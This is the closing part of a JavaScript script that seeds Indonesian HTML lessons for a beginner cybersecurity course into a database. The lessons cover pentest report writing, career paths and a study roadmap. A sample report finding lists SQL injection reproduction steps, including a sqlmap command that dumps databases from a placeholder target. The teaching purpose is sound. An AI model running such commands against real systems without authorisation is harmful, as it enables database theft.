${card(`<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Bagian</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Isi</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Pembaca</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Executive Summary</td><td style="padding:0.5rem 0.8rem;">Gambaran besar, tingkat risiko keseluruhan</td><td style="padding:0.5rem 0.8rem;">CEO, CISO, non-teknis</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Scope & Methodology</td><td style="padding:0.5rem 0.8rem;">Apa yang di-test, tools, periode waktu</td><td style="padding:0.5rem 0.8rem;">Manager, auditor</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Findings</td><td style="padding:0.5rem 0.8rem;">Daftar vulnerability, sorted by severity</td><td style="padding:0.5rem 0.8rem;">Developer, sysadmin</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Risk Summary</td><td style="padding:0.5rem 0.8rem;">Chart/tabel jumlah finding per severity</td><td style="padding:0.5rem 0.8rem;">Semua pihak</td></tr>
<tr style="background:#F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Appendix</td><td style="padding:0.5rem 0.8rem;">Raw output tools, referensi, evidence</td><td style="padding:0.5rem 0.8rem;">Developer, security team</td></tr>
</tbody></table>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Cara Menulis Satu Finding</h3>
${card(`<p style="margin:0 0 0.75rem;font-weight:800;color:#2D5016;font-size:1rem;">Contoh Finding — SQL Injection</p>
<p style="margin:0 0 0.3rem;font-size:0.78rem;text-transform:uppercase;letter-spacing:0.05em;color:#888;">Title</p>
<p style="margin:0 0 0.75rem;font-size:0.9rem;font-weight:700;">SQL Injection di Parameter <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">cat</code> — /listproducts.php</p>
<p style="margin:0 0 0.3rem;font-size:0.78rem;text-transform:uppercase;letter-spacing:0.05em;color:#888;">Severity</p>
<p style="margin:0 0 0.75rem;font-size:0.9rem;"><span style="background:#E53935;color:white;padding:0.15rem 0.6rem;border-radius:6px;font-weight:800;font-size:0.8rem;">Critical</span> — CVSS v3.1: 9.8</p>
<p style="margin:0 0 0.3rem;font-size:0.78rem;text-transform:uppercase;letter-spacing:0.05em;color:#888;">Description</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;">Parameter <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">cat</code> pada endpoint <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/listproducts.php</code> tidak melakukan sanitasi input, memungkinkan penyerang untuk mengeksekusi query SQL arbitrary ke dalam database backend.</p>
<p style="margin:0 0 0.3rem;font-size:0.78rem;text-transform:uppercase;letter-spacing:0.05em;color:#888;">Steps to Reproduce</p>
<ol style="margin:0 0 0.75rem;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.3rem;">Buka <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">http://target.com/listproducts.php?cat=1</code></li>
<li style="margin-bottom:0.3rem;">Append tanda kutip tunggal: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">?cat=1'</code> → SQL syntax error muncul</li>
<li style="margin-bottom:0.3rem;">Jalankan: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">sqlmap -u "http://target.com/listproducts.php?cat=1" --dbs</code></li>
<li>SQLmap berhasil dump nama database → akses tabel users</li>
</ol>
<p style="margin:0 0 0.3rem;font-size:0.78rem;text-transform:uppercase;letter-spacing:0.05em;color:#888;">Impact</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;">Penyerang dapat membaca seluruh isi database, termasuk tabel <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">users</code> yang berisi nama, email, dan password hash seluruh pengguna. Potensi data breach skala penuh.</p>
<p style="margin:0 0 0.3rem;font-size:0.78rem;text-transform:uppercase;letter-spacing:0.05em;color:#888;">Recommendation</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;">Gunakan <strong>prepared statements</strong> (parameterized queries) untuk semua query database. Validasi dan sanitasi input user di sisi server. Implementasi WAF sebagai mitigasi tambahan.</p>
<p style="margin:0 0 0.3rem;font-size:0.78rem;text-transform:uppercase;letter-spacing:0.05em;color:#888;">References</p>
<p style="margin:0;font-size:0.87rem;">CWE-89, OWASP A03:2021 — Injection, PortSwigger SQL Injection</p>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Severity Rating</h3>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Level</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Kriteria</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Waktu Patch</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;background:#FFF5F5;"><td style="padding:0.5rem 0.8rem;"><span style="background:#E53935;color:white;padding:0.1rem 0.5rem;border-radius:4px;font-size:0.78rem;font-weight:800;">Critical</span></td><td style="padding:0.5rem 0.8rem;">Eksploitasi langsung → data breach / takeover</td><td style="padding:0.5rem 0.8rem;font-weight:700;color:#E53935;">Hari ini</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FFF8EE;"><td style="padding:0.5rem 0.8rem;"><span style="background:#E65100;color:white;padding:0.1rem 0.5rem;border-radius:4px;font-size:0.78rem;font-weight:800;">High</span></td><td style="padding:0.5rem 0.8rem;">Dampak signifikan, butuh kondisi tertentu</td><td style="padding:0.5rem 0.8rem;">Minggu ini</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;"><span style="background:#F57C00;color:white;padding:0.1rem 0.5rem;border-radius:4px;font-size:0.78rem;font-weight:800;">Medium</span></td><td style="padding:0.5rem 0.8rem;">Dampak terbatas atau butuh interaksi user</td><td style="padding:0.5rem 0.8rem;">Sprint berikutnya</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;"><span style="background:#7CB342;color:white;padding:0.1rem 0.5rem;border-radius:4px;font-size:0.78rem;font-weight:800;">Low</span></td><td style="padding:0.5rem 0.8rem;">Best practice violation, informational</td><td style="padding:0.5rem 0.8rem;">Jadwalkan</td></tr>
<tr><td style="padding:0.5rem 0.8rem;"><span style="background:#888;color:white;padding:0.1rem 0.5rem;border-radius:4px;font-size:0.78rem;font-weight:800;">Info</span></td><td style="padding:0.5rem 0.8rem;">Perlu diketahui, tidak ada dampak langsung</td><td style="padding:0.5rem 0.8rem;">Opsional</td></tr>
</tbody></table>

${note("⭐ Jangan inflate severity. Klien kehilangan kepercayaan kalau semua finding di-mark Critical tapi ternyata tidak berbahaya di konteks mereka.", "#FFF3D6", "#F5A62A")}
${note("🎯 <strong>Next step:</strong> Video 19 — Career Path. SOC Analyst, Pentester, Bug Hunter — pilih jalur kamu.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── VID 19: Career Path ──────────────────────────────────────────────────
{
  title: "🚀 Career Path: SOC Analyst, Pentester, Bug Hunter",
  module_index: 7,
  order_index: 0,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">🚀 Career Path: SOC Analyst, Pentester, Bug Hunter</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Versi artikel dari Video 19. Tiga jalur karir utama di dunia cyber security — pilih berdasarkan minat dan gaya hidup kamu.</p>
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

${card(`<div style="display:flex;align-items:flex-start;gap:0.75rem;margin-bottom:0.75rem;">
<span style="flex-shrink:0;background:#1565C0;color:white;font-size:1.2rem;padding:0.4rem 0.6rem;border-radius:8px;">🛡️</span>
<div><p style="margin:0 0 0.3rem;font-weight:800;color:#2D5016;font-size:1rem;">Jalur 1: SOC Analyst</p>
<p style="margin:0;font-size:0.82rem;color:#666;">Tim yang memonitor keamanan 24/7</p></div></div>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;width:140px;">Apa yang dilakukan</td><td style="padding:0.5rem 0.8rem;">Monitor alert SIEM, investigasi insiden, analisis log, incident response</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Skill utama</td><td style="padding:0.5rem 0.8rem;">SIEM (Splunk, Microsoft Sentinel), log analysis, threat intelligence, network forensics</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Gaji Indonesia</td><td style="padding:0.5rem 0.8rem;">Junior: Rp 5–12 juta | Senior: Rp 20–40 juta | Remote internasional: USD 60–80k/tahun</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Jalur masuk</td><td style="padding:0.5rem 0.8rem;">CompTIA Security+ → Blue Team Level 1 → SOC Analyst L1 → SIEM certification</td></tr>
<tr><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Realita</td><td style="padding:0.5rem 0.8rem;">Shift kerja, banyak false positive. Tapi lowongan terbanyak dan paling mudah untuk masuk industry.</td></tr>
</tbody></table>`)}

${card(`<div style="display:flex;align-items:flex-start;gap:0.75rem;margin-bottom:0.75rem;">
<span style="flex-shrink:0;background:#E53935;color:white;font-size:1.2rem;padding:0.4rem 0.6rem;border-radius:8px;">⚔️</span>
<div><p style="margin:0 0 0.3rem;font-weight:800;color:#2D5016;font-size:1rem;">Jalur 2: Penetration Tester</p>
<p style="margin:0;font-size:0.82rem;color:#666;">Dibayar untuk menyerang sistem secara legal</p></div></div>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;width:140px;">Apa yang dilakukan</td><td style="padding:0.5rem 0.8rem;">Web app pentest, network pentest, mobile pentest, red team, social engineering, laporan</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Skill utama</td><td style="padding:0.5rem 0.8rem;">Semua yang di course ini + AD attacks, custom exploits, report writing, client communication</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Gaji Indonesia</td><td style="padding:0.5rem 0.8rem;">Junior: Rp 8–20 juta | Senior: Rp 30–80 juta | Konsultan independen: tidak terbatas</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Sertifikasi</td><td style="padding:0.5rem 0.8rem;"><strong>eJPT</strong> (entry) → <strong>CEH</strong> (mid) → <strong>OSCP</strong> (standar emas industry)</td></tr>
<tr><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Realita</td><td style="padding:0.5rem 0.8rem;">Project-based, banyak deadline, harus selalu update skills. Salah satu pekerjaan paling menarik di dunia tech.</td></tr>
</tbody></table>`)}

${card(`<div style="display:flex;align-items:flex-start;gap:0.75rem;margin-bottom:0.75rem;">
<span style="flex-shrink:0;background:#F57C00;color:white;font-size:1.2rem;padding:0.4rem 0.6rem;border-radius:8px;">🐞</span>
<div><p style="margin:0 0 0.3rem;font-weight:800;color:#2D5016;font-size:1rem;">Jalur 3: Bug Hunter (Independent)</p>
<p style="margin:0;font-size:0.82rem;color:#666;">Freelance — tidak terikat perusahaan</p></div></div>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;width:140px;">Apa yang dilakukan</td><td style="padding:0.5rem 0.8rem;">Pilih program di HackerOne/Bugcrowd, test dalam scope, submit laporan, terima reward</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Skill utama</td><td style="padding:0.5rem 0.8rem;">Web vulnerability expertise, recon yang kuat, kreativitas, persistensi, report writing</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Income</td><td style="padding:0.5rem 0.8rem;">Sangat variable. Rata-rata aktif: USD 3–10k/tahun sampingan. Top researcher: USD 500k+/tahun</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Jalur masuk</td><td style="padding:0.5rem 0.8rem;">Mulai dari VDP → paid programs → build reputation → private invitations</td></tr>
<tr><td style="padding:0.5rem 0.8rem;font-weight:700;color:#2D5016;">Realita</td><td style="padding:0.5rem 0.8rem;">Tidak ada gaji tetap, banyak rejection. Tapi kebebasan penuh dan scalable seiring skill berkembang.</td></tr>
</tbody></table>`)}

<h3 style="color:#2D5016;font-size:1.05rem;font-weight:800;margin:1.75rem 0 0.5rem;">Perbandingan Cepat</h3>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Kriteria</th><th style="padding:0.5rem 0.8rem;text-align:center;color:#2D5016;">SOC Analyst</th><th style="padding:0.5rem 0.8rem;text-align:center;color:#2D5016;">Pentester</th><th style="padding:0.5rem 0.8rem;text-align:center;color:#2D5016;">Bug Hunter</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Gaji stabil</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td><td style="padding:0.5rem 0.8rem;text-align:center;">❌</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Variasi pekerjaan</td><td style="padding:0.5rem 0.8rem;text-align:center;">⬜</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Kebebasan waktu</td><td style="padding:0.5rem 0.8rem;text-align:center;">❌</td><td style="padding:0.5rem 0.8rem;text-align:center;">⬜</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Mudah masuk industry</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td><td style="padding:0.5rem 0.8rem;text-align:center;">⬜</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td></tr>
<tr style="background:#F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Potensi income tertinggi</td><td style="padding:0.5rem 0.8rem;text-align:center;">⬜</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td><td style="padding:0.5rem 0.8rem;text-align:center;">✅</td></tr>
</tbody></table>
${note("🎯 <strong>Next:</strong> Video 20 — Video terakhir. Roadmap lanjutan dan komunitas yang akan membantu perjalanan kamu.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── VID 20: Final / Roadmap ──────────────────────────────────────────────
{
  title: "🏁 Final — Roadmap Belajar Lanjutan & Komunitas",
  module_index: 7,
  order_index: 1,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">🏁 Final — Roadmap Belajar Lanjutan & Komunitas</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Video terakhir course ini. Kamu sudah menyelesaikan fondasi yang solid — ini adalah peta untuk perjalanan selanjutnya.</p>
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">✅ Yang Sudah Kamu Kuasai</h3>
${card(`<div style="display:flex;flex-wrap:wrap;gap:0.5rem;">
${["Reconnaissance & OSINT","Nmap & Enumeration","CVE & CVSS Reading","OWASP Top 10","SQL Injection + SQLmap","XSS (Reflected/Stored/DOM)","Authentication Bypass","Directory Traversal","Metasploit Framework","Post-Exploitation","Bug Bounty Methodology","Pentest Report Writing","Career Path Planning"].map(s => `<span style="background:#F0E8D8;border:1px solid #7AB648;padding:0.2rem 0.6rem;border-radius:6px;font-size:0.82rem;font-weight:700;color:#2D5016;">✓ ${s}</span>`).join(" ")}
</div>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">🗺️ Roadmap Lanjutan</h3>
${card(`<p style="margin:0 0 0.75rem;font-weight:800;color:#2D5016;">Level 1 → Intermediate (3–6 bulan)</p>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;width:180px;">TryHackMe</td><td style="padding:0.5rem 0.8rem;">Learning path "Jr Penetration Tester" — gamifikasi, sangat ramah pemula</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">PortSwigger Labs</td><td style="padding:0.5rem 0.8rem;">Selesaikan semua lab gratis (200+ lab) — web security paling komprehensif</td></tr>
<tr style="background:#F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">eJPT Certification</td><td style="padding:0.5rem 0.8rem;">Exam berbasis lab, ~Rp 1.5 juta — sertifikasi entry pentest yang diakui industry</td></tr>
</tbody></table>`)}
${card(`<p style="margin:0 0 0.75rem;font-weight:800;color:#2D5016;">Level 2 → Advanced (6–18 bulan)</p>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;width:180px;">Hack The Box</td><td style="padding:0.5rem 0.8rem;">Mulai dari Starting Point machines, naik ke Easy → Medium → Hard</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Active Directory</td><td style="padding:0.5rem 0.8rem;">Belajar AD attacks — BloodHound, Kerberoasting, Pass-the-Hash</td></tr>
<tr style="background:#F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">OSCP</td><td style="padding:0.5rem 0.8rem;">Standar emas pentester — 24 jam exam, fully hands-on lab. ~USD 1,500</td></tr>
</tbody></table>`)}
${card(`<p style="margin:0 0 0.75rem;font-weight:800;color:#2D5016;">Mulai Bug Bounty (bisa paralel)</p>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;width:180px;">Bulan 1–2</td><td style="padding:0.5rem 0.8rem;">Pilih 1 VDP di HackerOne, cari IDOR dan information disclosure</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Bulan 3–6</td><td style="padding:0.5rem 0.8rem;">Naik ke paid program, fokus web vulnerabilities dari PortSwigger</td></tr>
<tr style="background:#F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Bulan 6+</td><td style="padding:0.5rem 0.8rem;">Build reputation, dapat private invitations, expand ke mobile app</td></tr>
</tbody></table>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">👥 Bergabung dengan Komunitas</h3>
${card(`<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;width:200px;">Discord Kaalupi</td><td style="padding:0.5rem 0.8rem;">Komunitas student course ini — tanya, diskusi, share progress, peer learning</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Reddit r/netsec</td><td style="padding:0.5rem 0.8rem;">Berita dan diskusi teknis terbaru di dunia security</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">CTF Competitions</td><td style="padding:0.5rem 0.8rem;">PicoCTF (pemula) → CTFtime.org (kompetisi global) → HackTheBox CTF</td></tr>
<tr style="background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Twitter/X</td><td style="padding:0.5rem 0.8rem;">Follow security researcher — update zero-day, write-up, dan trend terbaru</td></tr>
</tbody></table>`)}

<div style="background:linear-gradient(135deg,#2D5016,#4A7C2F);border-radius:16px;padding:1.5rem;margin:1.5rem 0;text-align:center;">
<p style="margin:0 0 0.5rem;font-size:1.1rem;font-weight:800;color:white;">Selamat — kamu sudah menyelesaikan course ini.</p>
<p style="margin:0;font-size:0.9rem;color:rgba(255,255,255,0.85);">Fondasi yang kamu bangun di sini adalah yang dibutuhkan untuk memulai karir di dunia cyber security. Yang membedakan professional yang baik bukan berapa banyak yang mereka tahu sekarang — tapi seberapa cepat mereka bisa belajar hal baru.</p>
</div>
</div>`
}

]; // end articles

async function main() {
  for (const a of articles) {
    const { data, error } = await supabase
      .from("materials")
      .insert({
        course_slug: "cyber-security-pemula",
        title: a.title,
        content: a.content,
        video_url: null,
        module_index: a.module_index,
        order_index: a.order_index,
      })
      .select("id, title, module_index, order_index")
      .single();

    if (error) {
      console.error(`❌ [mod:${a.module_index} ord:${a.order_index}] ${a.title}\n   ${error.message}`);
    } else {
      console.log(`✅ [mod:${data.module_index} ord:${data.order_index}] ${data.title}`);
    }
  }

  console.log("\n📋 Final check modul 4–7:");
  for (const mod of [4, 5, 6, 7]) {
    const { data } = await supabase
      .from("materials")
      .select("title, order_index")
      .eq("course_slug", "cyber-security-pemula")
      .eq("module_index", mod)
      .order("order_index");
    if (data?.length) {
      console.log(`  Modul ${mod}:`);
      data.forEach(m => console.log(`    [${m.order_index}] ${m.title.slice(0, 50)}`));
    }
  }
}

main();
